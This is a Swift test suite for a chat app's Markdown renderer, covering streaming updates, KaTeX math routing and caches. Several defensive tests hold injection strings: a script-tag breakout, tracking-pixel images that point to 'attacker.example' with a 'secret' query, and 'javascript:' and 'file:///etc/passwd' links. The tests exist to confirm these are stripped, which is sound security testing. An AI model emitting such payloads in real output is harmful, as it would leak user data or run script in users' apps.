//
//  ChatLLMTests+MarkdownRendering
//  ChatLLMTests
//
//  Split out of ChatLLMTests.swift; part of the single @Suite(.serialized) ChatLLMTests suite.
//

import Testing
import Foundation
import MLXLMCommon
import SwiftUI
import SwiftData
import WebKit
import UIKit
import FoundationModels
@testable import ChatLLM

extension ChatLLMTests {
    @Test func nativeMarkdownParserPreservesParagraphWhitespaceAndInlineFormatting() throws {
        let parsed = try #require(NativeMarkdownParser.attributedString(from: """
        First paragraph.

        **Second paragraph.**
        """))

        #expect(String(parsed.characters) == "First paragraph.\n\nSecond paragraph.")
    }

    @Test func nativeMarkdownPreservesSpacesBreaksAndCodeAcrossStreamedPrefixes() throws {
        let source = "First **bold** word.\nNext  line.\n\nUse `first_name` and _italic_ text."
        var accumulated = ""
        for chunk in ["First ", "**bold", "** word.", "\n", "Next  line.", "\n\n", "Use `first_name` and _italic_ text."] {
            accumulated = try #require(ChatViewModel.mergedStreamingChunk(currentText: accumulated, newText: chunk))
            let parsed = try #require(NativeMarkdownParser.attributedString(from: accumulated))
            #expect(!parsed.characters.isEmpty)
        }
        #expect(accumulated == source)
        let parsed = try #require(NativeMarkdownParser.attributedString(from: accumulated))
        #expect(String(parsed.characters) == "First bold word.\nNext  line.\n\nUse first_name and italic text.")
        #expect(parsed.runs.contains { $0.inlinePresentationIntent?.contains(.stronglyEmphasized) == true })
        #expect(parsed.runs.contains { $0.inlinePresentationIntent?.contains(.emphasized) == true })
    }

    @Test func streamingPublishesShortMarkdownChunksBeforeGenerationFinishes() async throws {
        let (stream, continuation) = AsyncThrowingStream<String, Error>.makeStream()
        let viewModel = try makeViewModel(generator: ControlledMarkdownGenerator(stream: stream))
        let message = Message(role: .assistant, text: "", order: 1, conversation: viewModel.conversation)
        viewModel.conversation.messages = [
            Message(role: .user, text: "Say hello", order: 0, conversation: viewModel.conversation, isFinal: true),
            message
        ]
        let generation = Task { await viewModel.streamAssistant(into: message, basedOnHistoryUpTo: 1) }
        defer { continuation.finish(); generation.cancel() }

        continuation.yield("**Hi")
        let deadline = ContinuousClock.now.advanced(by: .seconds(5))
        while message.text.isEmpty && ContinuousClock.now < deadline {
            try await Task.sleep(for: .milliseconds(10))
        }
        #expect(message.text == "**Hi")
        try await Task.sleep(for: .milliseconds(150))
        continuation.yield("**\n\nOK")
        let nextDeadline = ContinuousClock.now.advanced(by: .seconds(5))
        while message.text != "**Hi**\n\nOK" && ContinuousClock.now < nextDeadline {
            try await Task.sleep(for: .milliseconds(10))
        }
        #expect(message.text == "**Hi**\n\nOK")
        #expect(!message.isFinal)
        continuation.finish()
        #expect(await generation.value == .succeeded)
        #expect(message.isFinal)
    }

    @Test func webMarkdownRendersBlocksAndLatestStreamingUpdateWithoutReloading() async throws {
        let renderer = MarkdownWebTestHarness()
        defer { renderer.close() }
        renderer.update("## Starting")
        // Updates received before navigation finishes must not be dropped.
        renderer.update("## Streaming\n\nFirst **bold** word.\nNext line.")
        try await renderer.waitFor("document.querySelector('strong')?.textContent === 'bold'")
        #expect(renderer.hasMeasuredHeight)
        #expect(!renderer.failedToLoad)
        #expect(try await renderer.webView.evaluateJavaScript("document.querySelectorAll('h2').length") as? Int == 1)
        #expect(try await renderer.webView.evaluateJavaScript("document.querySelector('p').textContent") as? String == "First bold word.\nNext line.")
        #expect(try await renderer.webView.evaluateJavaScript("document.querySelectorAll('br').length") as? Int == 1)
        _ = try await renderer.webView.evaluateJavaScript("window.renderIdentity = 'same-document'")

        renderer.update("## Streaming\n\n- First\n- Sec")
        renderer.update("## Streaming\n\n- First\n- Second\n\n```swift\nlet first_name = 1")
        renderer.update("## Finished\n\n- First\n- Second\n\n```swift\nlet first_name = 1\n```\n\nLast **paragraph**.")
        try await renderer.waitFor("document.querySelector('strong')?.textContent === 'paragraph'")
        #expect(try await renderer.webView.evaluateJavaScript("window.renderIdentity") as? String == "same-document")
        #expect(try await renderer.webView.evaluateJavaScript("document.querySelectorAll('li').length") as? Int == 2)
        #expect(try await renderer.webView.evaluateJavaScript("document.querySelector('pre code').textContent") as? String == "let first_name = 1\n")
        #expect(try await renderer.webView.evaluateJavaScript("document.querySelectorAll('p').length") as? Int == 1)
        #expect(!renderer.failedToLoad)
    }

    @Test func webMarkdownHeightCanShrinkAndAppearanceUpdatesDoNotReload() async throws {
        let renderer = MarkdownWebTestHarness()
        defer { renderer.close() }
        renderer.update((1...15).map { "Paragraph \($0)." }.joined(separator: "\n\n"))
        try await renderer.waitFor("document.querySelectorAll('p').length === 15")
        let tallHeight = renderer.height
        #expect(tallHeight > 400)
        renderer.webView.frame.size.height = tallHeight
        _ = try await renderer.webView.evaluateJavaScript("window.renderIdentity = 'same-document'")
        renderer.update("**Short** text.", fontSize: 22, colorScheme: .dark)
        try await renderer.waitFor("document.querySelector('strong')?.textContent === 'Short'")
        #expect(renderer.height < tallHeight)
        #expect(renderer.hasMeasuredHeight)
        #expect(try await renderer.webView.evaluateJavaScript("getComputedStyle(document.body).fontSize") as? String == "22px")
        #expect(try await renderer.webView.evaluateJavaScript("window.renderIdentity") as? String == "same-document")
    }

    @Test func webMarkdownAcceptsCompletedHeightWhileNewerRenderingIsPending() async throws {
        let renderer = MarkdownWebTestHarness()
        defer { renderer.close() }
        renderer.update("# First")
        try await renderer.waitFor("document.querySelector('h1')?.textContent === 'First'")
        // Simulate a completed layout message arriving after the next render was
        // submitted. It must remain usable until a newer measurement arrives.
        _ = try await renderer.webView.evaluateJavaScript("""
        window.updateMarkdown = () => {
          document.getElementById('content').style.height = '123px';
          window.webkit.messageHandlers.richTextHeight.postMessage({height: 123, revision: 1});
          window.pendingRender = true;
        };
        true;
        """)
        renderer.update("# Second")
        try await renderer.waitFor("window.pendingRender === true")
        #expect(renderer.height == 123)
        // An older queued measurement must not overwrite the newer layout.
        _ = try await renderer.webView.evaluateJavaScript("""
        window.webkit.messageHandlers.richTextHeight.postMessage({height: 80, revision: 2});
        window.webkit.messageHandlers.richTextHeight.postMessage({height: 300, revision: 1});
        true;
        """)
        try await renderer.waitFor("true")
        #expect(renderer.height == 80)
    }

    @Test func webMarkdownTreatsModelOutputAsDataAndBlocksRemoteImages() async throws {
        let renderer = MarkdownWebTestHarness()
        defer { renderer.close() }
        renderer.update("""
        ## Safe

        </script><script>window.modelScriptRan = true</script>

        ![tracking](https://example.invalid/pixel)

        [link](https://example.com) and `first_name`.
        """)
        try await renderer.waitFor("document.querySelector('h2')?.textContent === 'Safe'")
        #expect(try await renderer.webView.evaluateJavaScript("typeof window.modelScriptRan") as? String == "undefined")
        #expect(try await renderer.webView.evaluateJavaScript("document.querySelectorAll('img').length") as? Int == 0)
        #expect(try await renderer.webView.evaluateJavaScript("document.querySelector('meta[http-equiv]').content") as? String == RichMarkdownRenderingPolicy.contentSecurityPolicy)
        #expect(try await renderer.webView.evaluateJavaScript("document.querySelector('a[href=\"https://example.com\"]').getAttribute('href')") as? String == "https://example.com")
        #expect(try await renderer.webView.evaluateJavaScript("document.querySelector('code').textContent") as? String == "first_name")
    }

    @Test func webMarkdownPreservesMathDelimitersAndLeavesCodeUntouched() async throws {
        let renderer = MarkdownWebTestHarness()
        defer { renderer.close() }
        renderer.update(#"Inline \(x_i^2\), display $$x^2$$ and `first_name` with `\(literal\)`."#)
        try await renderer.waitFor("document.querySelectorAll('.katex').length === 2")
        #expect(try await renderer.webView.evaluateJavaScript("Array.from(document.querySelectorAll('code')).map(e => e.textContent)") as? [String] == ["first_name", #"\(literal\)"#])
    }

    @Test func nativeLatexProcessorPreservesDollarAmounts() {
        let input = "The basic plan costs $5 per month and the pro plan costs $12 per month."

        #expect(LatexProcessor.process(input) == input)
    }

    // MARK: - Markdown routing

    @Test func mathDocumentStillBlocksRemoteResourceLoads() {
        // The KaTeX document is now reached only by math, but model output still
        // arrives there as data and must not be able to fetch anything remote.
        #expect(RichMarkdownRenderingPolicy.disabledMarkdownRules.contains("image"))
        #expect(RichMarkdownRenderingPolicy.contentSecurityPolicy.contains("default-src 'none'"))
        #expect(RichMarkdownRenderingPolicy.contentSecurityPolicy.contains("img-src data:"))
    }


    @Test func blockMarkdownUsesNativeRenderer() {
        // Headings, lists, quotes, code, rules and tables are all laid out
        // natively now. None of them may pull in the KaTeX document.
        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("## Heading"))
        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("- First\n- Second"))
        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("> Quoted text"))
        #expect(!RichTextFeatureDetector.requiresAdvancedRendering(">Quote"))
        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("1) First\n2) Second"))
        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("Heading\n==="))
        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("    first_name = 1"))
        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("| A | B |\n|---|---|\n| 1 | 2 |"))
        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("---"))
        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("```swift\nlet x = 1\n```"))
    }

    @Test func mathStillUsesAdvancedRenderer() {
        #expect(RichTextFeatureDetector.requiresAdvancedRendering(#"A formula: \(x^2\)"#))
        #expect(RichTextFeatureDetector.requiresAdvancedRendering("A display formula: $$x^2$$"))
        #expect(RichTextFeatureDetector.requiresAdvancedRendering(#"\[ x^2 \]"#))
        #expect(RichTextFeatureDetector.requiresAdvancedRendering(#"\begin{align} x \end{align}"#))
        #expect(RichTextFeatureDetector.requiresAdvancedRendering("## Heading\n\nThen $$x^2$$."))
    }

    @Test func codeSpansAndFencesNeverCountAsMath() {
        // Swift interpolation is the motivating case: `\(name)` inside a snippet
        // used to look exactly like inline TeX and spawned a WebView per message.
        #expect(!RichTextFeatureDetector.requiresAdvancedRendering(
            "```swift\nprint(\"Hello \\(name)\")\n```"
        ))
        #expect(!RichTextFeatureDetector.requiresAdvancedRendering(
            "~~~swift\nlet total = \"\\(count) items\"\n~~~"
        ))
        #expect(!RichTextFeatureDetector.requiresAdvancedRendering(#"Use `\(literal\)` in code."#))
        // Real math outside a snippet is still honoured.
        #expect(RichTextFeatureDetector.requiresAdvancedRendering(
            "```swift\nlet x = \"\\(a)\"\n```\n\nWhich solves $$x^2 = 4$$."
        ))
    }

    @Test func ordinaryTextIsNotMistakenForMath() {
        #expect(!RichTextFeatureDetector.requiresAdvancedRendering("First paragraph.\n\nSecond paragraph."))
        #expect(!RichTextFeatureDetector.requiresAdvancedRendering(
            "The basic plan costs $5 per month and the pro plan costs $12 per month."
        ))
        #expect(!RichTextFeatureDetector.requiresAdvancedRendering(""))
    }

    // MARK: - Markdown block parsing
    @Test func nativeRendererReducesImagesToAltTextWithoutTheirURL() {
        let inline = "![tracking pixel](https://attacker.example/pixel?q=secret)"
        let sanitized = MarkdownInlineRenderer.sanitizedSource(inline)
        #expect(sanitized == "tracking pixel")

        let rendered = MarkdownInlineRenderer.attributed(inline, fontSize: 16)
        #expect(!String(rendered.characters).contains("attacker.example"))
        #expect(rendered.runs.allSatisfy { $0.link == nil })
    }

    @Test func nativeRendererDropsReferenceImagesAndTheirDefinitions() {
        #expect(MarkdownInlineRenderer.sanitizedSource("![tracking pixel][remote]") == "tracking pixel")

        let definition = "[remote]: https://attacker.example/pixel"
        #expect(MarkdownInlineRenderer.sanitizedSource(definition).isEmpty)

        let blocks = MarkdownBlockParser.parse("![tracking pixel][remote]\n\n[remote]: https://attacker.example/pixel")
        let text = blocks.map { block -> String in
            guard case let .paragraph(value) = block else { return "" }
            return String(MarkdownInlineRenderer.attributed(value, fontSize: 16).characters)
        }.joined()
        #expect(!text.contains("attacker.example"))
        #expect(text.contains("tracking pixel"))
    }

    @Test func nativeRendererKeepsWebLinksAndStripsOtherSchemes() {
        let rendered = MarkdownInlineRenderer.attributed(
            "[ok](https://example.com) and [bad](javascript:alert(1)) and [file](file:///etc/passwd)",
            fontSize: 16
        )

        let links = rendered.runs.compactMap { $0.link }
        #expect(links.allSatisfy { $0.scheme == "http" || $0.scheme == "https" })
        #expect(links.contains { $0.absoluteString == "https://example.com" })
    }

    @Test func nativeRendererStylesInlineCodeRuns() {
        let rendered = MarkdownInlineRenderer.attributed("Use `first_name` here.", fontSize: 16)

        #expect(String(rendered.characters) == "Use first_name here.")
        #expect(rendered.runs.contains {
            $0.inlinePresentationIntent?.contains(.code) == true && $0.font != nil
        })
    }

    @Test func nativeRendererPreservesEmphasisAcrossStreamedPrefixes() {
        let source = "First **bold** word.\nNext line with _italic_ text."
        for prefixLength in 1...source.count {
            let rendered = MarkdownInlineRenderer.attributed(String(source.prefix(prefixLength)), fontSize: 16)
            #expect(!String(rendered.characters).isEmpty)
        }

        let rendered = MarkdownInlineRenderer.attributed(source, fontSize: 16)
        #expect(String(rendered.characters) == "First bold word.\nNext line with italic text.")
        #expect(rendered.runs.contains { $0.inlinePresentationIntent?.contains(.stronglyEmphasized) == true })
        #expect(rendered.runs.contains { $0.inlinePresentationIntent?.contains(.emphasized) == true })
    }

    // MARK: - Markdown caches

    @Test func blockCacheReturnsStableResultsAndStaysBounded() {
        MarkdownBlockCache.removeAll()
        let source = "## Heading\n\n- First\n- Second"
        #expect(MarkdownBlockCache.blocks(for: source) == MarkdownBlockParser.parse(source))
        #expect(MarkdownBlockCache.blocks(for: source) == MarkdownBlockParser.parse(source))

        for index in 0..<200 {
            _ = MarkdownBlockCache.blocks(for: "Message \(index)")
        }
        // Still correct after eviction has certainly happened.
        #expect(MarkdownBlockCache.blocks(for: source) == MarkdownBlockParser.parse(source))
    }

    @Test func heightCacheRoundTripsAndStaysBounded() {
        MarkdownHeightCache.removeAll()
        let key = MarkdownHeightCache.Key(text: #"$$x^2$$"#, fontSize: 16)
        #expect(MarkdownHeightCache.height(for: key) == nil)

        MarkdownHeightCache.store(120, for: key)
        #expect(MarkdownHeightCache.height(for: key) == 120)

        // A degenerate measurement must never be cached as a real height.
        MarkdownHeightCache.store(1, for: key)
        #expect(MarkdownHeightCache.height(for: key) == 120)

        for index in 0..<200 {
            MarkdownHeightCache.store(CGFloat(index + 2), for: .init(text: "m\(index)", fontSize: 16))
        }
        #expect(MarkdownHeightCache.height(for: .init(text: "m199", fontSize: 16)) == 201)
        #expect(MarkdownHeightCache.height(for: .init(text: "m0", fontSize: 16)) == nil)
    }
}
